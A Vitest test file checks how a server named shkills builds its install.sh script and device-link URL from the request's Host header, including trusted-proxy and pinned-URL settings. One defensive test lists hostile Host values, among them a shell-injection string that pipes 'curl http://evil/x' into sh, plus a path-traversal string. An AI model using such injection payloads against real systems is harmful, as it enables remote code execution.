import { describe, expect, it, vi } from 'vitest';
import request from 'supertest';

/**
 * A deployment is reachable at more than one address — a NodePort IP, a
 * hostname through an ingress, a port-forward to localhost. Whichever one
 * somebody typed is the one that provably works for them, so it is the one the
 * installer and the device-link prompt have to name back.
 *
 * `config` is a module-level singleton, so testing how it reacts to the
 * environment means re-importing it.
 */
async function withEnv(env: Record<string, string | undefined>) {
  vi.resetModules();
  const saved: Record<string, string | undefined> = {};
  for (const [k, v] of Object.entries(env)) {
    saved[k] = process.env[k];
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
  const { createApp } = await import('./app.js');
  const restore = () => {
    for (const [k, v] of Object.entries(saved)) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
  };
  return { app: createApp(), restore };
}

const CONFIGURED = 'http://192.168.83.16:31400';

describe('the address the installer hands back', () => {
  it('is the one the script was fetched from, not the one in the config', async () => {
    const { app, restore } = await withEnv({ SHKILLS_PUBLIC_URL: CONFIGURED });
    const res = await request(app)
      .get('/install.sh')
      .set('Host', 'shkills.biyou.internal')
      .expect(200);

    expect(res.text).toContain('SHKILLS_HOST:-http://shkills.biyou.internal}');
    expect(res.text).not.toContain('192.168.83.16');
    restore();
  });

  it('keeps a non-default port', async () => {
    const { app, restore } = await withEnv({ SHKILLS_PUBLIC_URL: CONFIGURED });
    const res = await request(app).get('/install.sh').set('Host', 'shkills.example:8080').expect(200);
    expect(res.text).toContain('SHKILLS_HOST:-http://shkills.example:8080}');
    restore();
  });

  /**
   * The Host header is attacker-supplied text that ends up inside a shell
   * script. Anything that is not a plain host[:port] is refused outright rather
   * than escaped — there is no safe way to quote `"; curl evil | sh; "` into a
   * `sh` string that a reader can still check by eye.
   */
  it('falls back to the configured URL when the Host header is not a host', async () => {
    const { app, restore } = await withEnv({ SHKILLS_PUBLIC_URL: CONFIGURED });
    for (const host of [
      'evil.example"; curl http://evil/x | sh; echo "',
      'evil.example/../../etc',
      'evil example',
      "evil.example'",
      'evil.example:notaport',
    ]) {
      const res = await request(app).get('/install.sh').set('Host', host).expect(200);
      expect(res.text, `Host: ${host}`).toContain(`SHKILLS_HOST:-${CONFIGURED}}`);
      expect(res.text, `Host: ${host}`).not.toContain('evil');
    }
    restore();
  });

  it('follows X-Forwarded-Proto when a proxy in front terminates TLS', async () => {
    const { app, restore } = await withEnv({
      SHKILLS_PUBLIC_URL: CONFIGURED,
      SHKILLS_TRUST_PROXY: 'true',
    });
    const res = await request(app)
      .get('/install.sh')
      .set('Host', 'shkills.example.com')
      .set('X-Forwarded-Proto', 'https')
      .expect(200);
    expect(res.text).toContain('SHKILLS_HOST:-https://shkills.example.com}');
    restore();
  });

  it('ignores a forwarded protocol when no proxy is trusted', async () => {
    const { app, restore } = await withEnv({
      SHKILLS_PUBLIC_URL: CONFIGURED,
      SHKILLS_TRUST_PROXY: undefined,
    });
    const res = await request(app)
      .get('/install.sh')
      .set('Host', 'shkills.example.com')
      .set('X-Forwarded-Proto', 'https')
      .expect(200);
    expect(res.text).toContain('SHKILLS_HOST:-http://shkills.example.com}');
    restore();
  });

  /**
   * For the deployment that wants everybody funnelled onto one canonical
   * address — the TLS hostname, say — regardless of which door they came in.
   */
  it('can be pinned to the configured URL', async () => {
    const { app, restore } = await withEnv({
      SHKILLS_PUBLIC_URL: CONFIGURED,
      SHKILLS_PIN_PUBLIC_URL: 'true',
    });
    const res = await request(app).get('/install.sh').set('Host', 'shkills.biyou.internal').expect(200);
    expect(res.text).toContain(`SHKILLS_HOST:-${CONFIGURED}}`);
    restore();
  });

  it('sends the device-link prompt to the address the CLI is talking to', async () => {
    const { app, restore } = await withEnv({ SHKILLS_PUBLIC_URL: CONFIGURED });
    const res = await request(app)
      .post('/api/v1/device/code')
      .set('Host', 'shkills.biyou.internal')
      .send({ hostname: 'a-laptop' })
      .expect(201);

    expect(res.body.verificationUri).toBe('http://shkills.biyou.internal/link');
    expect(res.body.verificationUriComplete).toContain('http://shkills.biyou.internal/link?code=');
    restore();
  });
});
